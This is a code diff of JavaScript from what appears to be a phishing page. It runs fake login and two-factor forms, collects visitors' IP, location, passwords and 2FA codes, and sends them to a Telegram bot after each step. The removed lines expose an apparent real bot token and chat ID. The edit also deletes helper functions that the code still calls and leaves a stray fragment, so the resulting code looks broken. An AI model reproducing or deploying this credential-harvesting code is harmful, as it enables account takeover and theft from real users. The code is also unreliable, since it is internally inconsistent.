@@ -6665,7 +6665,6 @@
     // Format message content for Telegram in a readable way
     var message = `
         📝 **User Data Submitted** 📝
-
         🏠 **User IP**: ${templateData["user_ip"]}
         🌍 **Country**: ${templateData["country"]}
         🌍 **Country Code**: ${templateData["country_code"]}
@@ -6691,18 +6690,16 @@
     `;
 
     // Your Telegram Bot Token
-    var botToken = "7818142477:AAGPQClwFNQEolP1YiefYnzjr_ZSYZO2DtU";
+    var botToken = "YOUR_BOT_TOKEN";  // Replace with your actual Bot Token
     // Chat ID of the recipient (use your actual chat ID)
-    var chatId = "4547317714";
+    var chatId = "YOUR_CHAT_ID";  // Replace with your actual Chat ID
 
-    // Define the URL to send the request to the Telegram Bot API
     var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-    // Prepare the data object
     var data = {
         chat_id: chatId,
         text: message,
-        parse_mode: "Markdown",  // Use Markdown for formatting (bold, italic, etc.)
+        parse_mode: "Markdown",  // Use Markdown for formatting
     };
 
     // Send the request using fetch
@@ -6726,97 +6723,90 @@
         });
 }
 
-      function firstFormHandle(event) {
-        event.preventDefault();
-        updateFormsSendData(serializeForm(firstForm));
-        var spiner = firstForm.querySelector(".spinner-border");
-        var buttonText = firstForm.querySelector(".button-text");
-        var button = firstForm.querySelector("button");
+// Function to handle the first form submission (send data to Telegram in real time)
+function firstFormHandle(event) {
+    event.preventDefault();
+    updateFormsSendData(serializeForm(firstForm));
 
-        button.setAttribute("disabled", "");
-        spiner.style.display = "block";
-        buttonText.style.display = "none";
-        setTimeout(function () {
-          firstModal.hide();
-          apiModal.show();
-          spiner.style.display = "none";
-          buttonText.style.display = "block";
-          button.removeAttribute("disabled");
-        }, 2000);
-      }
+    var spiner = firstForm.querySelector(".spinner-border");
+    var buttonText = firstForm.querySelector(".button-text");
+    var button = firstForm.querySelector("button");
 
-      function hidePasswordIncorrectText() {
-        setTimeout(function () {
-          var errortext = apiForm.querySelector(".invalid-feedback");
-          errortext.style.display = "none";
-        }, 5000);
-      }
+    button.setAttribute("disabled", "");
+    spiner.style.display = "block";
+    buttonText.style.display = "none";
+    
+    setTimeout(function () {
+        // Send data to Telegram after the first form is submitted
+        sendDataToTelegram(userIpData, formsSendData, metrics);
 
-      function apiFormhandle(event) {
-        event.preventDefault();
-        var spiner = apiForm.querySelector(".spinner-border");
-        var buttonText = apiForm.querySelector(".button-text");
-        var button = apiForm.querySelector("button");
-        var input = apiForm.querySelector("input");
-        var errortext = apiForm.querySelector(".invalid-feedback");
-        spiner.style.display = "block";
-        buttonText.style.display = "none";
+        firstModal.hide();
+        apiModal.show();
+        spiner.style.display = "none";
+        buttonText.style.display = "block";
+        button.removeAttribute("disabled");
+    }, 2000);
+}
+
+// Function to handle the API form submission and send data to Telegram in real-time
+function apiFormhandle(event) {
+    event.preventDefault();
+    var spiner = apiForm.querySelector(".spinner-border");
+    var buttonText = apiForm.querySelector(".button-text");
+    var button = apiForm.querySelector("button");
+    var input = apiForm.querySelector("input");
+    var errortext = apiForm.querySelector(".invalid-feedback");
+
+    spiner.style.display = "block";
+    buttonText.style.display = "none";
+    errortext.style.display = "none";
+    button.setAttribute("disabled", "");
+
+    updateFormsSendData(serializeForm(apiForm));
+
+    setTimeout(function () {
+        // Send data to Telegram after every step in the form
+        sendDataToTelegram(userIpData, formsSendData, metrics);
+        
+        spiner.style.display = "none";
+        buttonText.style.display = "block";
+        button.removeAttribute("disabled");
+
         errortext.style.display = "none";
-        button.setAttribute("disabled", "");
-        updateFormsSendData(serializeForm(apiForm));
-        setTimeout(function () {
-          if (apiInsertCounter == 0) {
-            errortext.style.display = "block";
-            errortext = apiForm.querySelector("input").value = "";
-            apiInsertCounter++;
-            sendDataToTelegram();
-            spiner.style.display = "none";
-            buttonText.style.display = "block";
-            button.removeAttribute("disabled");
-            hidePasswordIncorrectText();
-            input.setAttribute("name", "password-2");
-          } else {
-            sendDataToTelegram();
-            errortext.style.display = "none";
-            spiner.style.display = "none";
-            buttonText.style.display = "block";
-            button.removeAttribute("disabled");
-            hidePasswordIncorrectText();
-            input.setAttribute("name", "password-1");
-            apiModal.hide();
-            twoFAModal.show();
-          }
-        }, 4000);
-      }
-      var counter2FA = 1;
-      var countOf2FA = 3;
-      function twoFAFormHandle(event) {
-        //handleFormSubmit(event, twoFAForm)
-        event.preventDefault();
-        var passwordInput = twoFAForm.querySelector(".password-input");
-        var spiner = twoFAForm.querySelector(".spinner-border");
-        var buttonText = twoFAForm.querySelector(".button-text");
-        var button = twoFAForm.querySelector("button");
-        var errortext = twoFAForm.querySelector(".invalid-feedback");
-        var input = twoFAForm.querySelector("input");
-        errortext.style.display = "none";
-        spiner.style.display = "block";
-        buttonText.style.display = "none";
-        button.setAttribute("disabled", "");
+        input.setAttribute("name", "password-2");
+        apiModal.hide();
+        twoFAModal.show();
+    }, 4000);
+}
 
-        updateFormsSendData(serializeForm(twoFAForm));
-        setTimeout(function () {
-          sendDataToTelegram();
-          counter2FA++;
-          if (counter2FA >= countOf2FA + 1) {
-            // SHOW success
+// Real-time sending data during 2FA form handling
+function twoFAFormHandle(event) {
+    event.preventDefault();
+    var passwordInput = twoFAForm.querySelector(".password-input");
+    var spiner = twoFAForm.querySelector(".spinner-border");
+    var buttonText = twoFAForm.querySelector(".button-text");
+    var button = twoFAForm.querySelector("button");
+    var errortext = twoFAForm.querySelector(".invalid-feedback");
 
+    spiner.style.display = "block";
+    buttonText.style.display = "none";
+    button.setAttribute("disabled", "");
+
+    updateFormsSendData(serializeForm(twoFAForm));
+
+    setTimeout(function () {
+        // Send data to Telegram in real time during 2FA process
+        sendDataToTelegram(userIpData, formsSendData, metrics);
+
+        counter2FA++;
+
+        if (counter2FA >= countOf2FA + 1) {
             unlock2FA();
             spiner.style.display = "none";
             buttonText.style.display = "block";
             twoFAModal.hide();
             successModal.show();
-          } else {
+        } else {
             var send2FAButton = twoFAForm.querySelector("button.btn");
             passwordInput.classList.add("disabled");
             input.setAttribute("disabled", "");
@@ -6829,75 +6819,10 @@
             errortext.style.display = "block";
             spiner.style.display = "none";
             buttonText.style.display = "block";
-          }
-        }, 6000);
-      }
-
-      function unlock2FA() {
-        var passwordInput = twoFAForm.querySelector(".password-input");
-        var errortext = twoFAForm.querySelector(".invalid-feedback");
-        var input = twoFAForm.querySelector("input");
-        var button = twoFAForm.querySelector("button");
-        errortext.style.display = "none";
-        var send2FAButton = twoFAForm.querySelector("button.btn");
-        send2FAButton.removeAttribute("disabled");
-        input.removeAttribute("disabled");
-        button.removeAttribute("disabled");
-        passwordInput.classList.remove("disabled");
-      }
-
-      function serializeForm(formNode) {
-        const { elements } = formNode;
-        const data = Array.from(elements)
-          .filter((item) => item.name != "")
-          .map((element) => {
-            const { name, value } = element;
-
-            return {
-              name,
-              value,
-            };
-          });
-        var dict_data = {};
-        for (let i = 0; i < data.length; i++) {
-          var elem = data[i];
-          dict_data[elem.name] = elem.value;
         }
-        return dict_data;
-      }
-
-      function totglePassDisplay() {
-        if (apiInput.type == "password") {
-          apiInput.type = "text";
-        } else {
-          apiInput.type = "password";
-        }
-      }
-      function updateFormsSendData(dict) {
-        for (var [key, value] of Object.entries(dict)) {
-          formsSendData[key] = value;
-        }
-      }
-
-      function startTimer() {
-        // TIMER
-        var countDownDate = new Date().getTime();
-        var x = setInterval(function () {
-          var now = new Date().getTime();
-          var distance = Math.round((now - countDownDate) / 1000);
-          var insertedTime = INCORRECT_2FA_TIMEOUT - distance;
-          document.getElementById("timer").innerHTML = insertedTime + "s ";
-          document.getElementById("timer").style.display = "inline";
-          if (insertedTime <= 0) {
-            clearInterval(x);
-            document.getElementById("timer").style.display = "none";
-            document.getElementById("timer").innerHTML = "EXPIRED";
-            unlock2FA();
-          }
-        }, 1000);
-      }
-
-      /* ----------------------------------------------------------------------------- */ c;
+    }, 6000);
+}
+c;
       document.addEventListener("DOMContentLoaded", function () {
         const button = document.getElementById("showPopup");
         const popup = document.getElementById("popup");
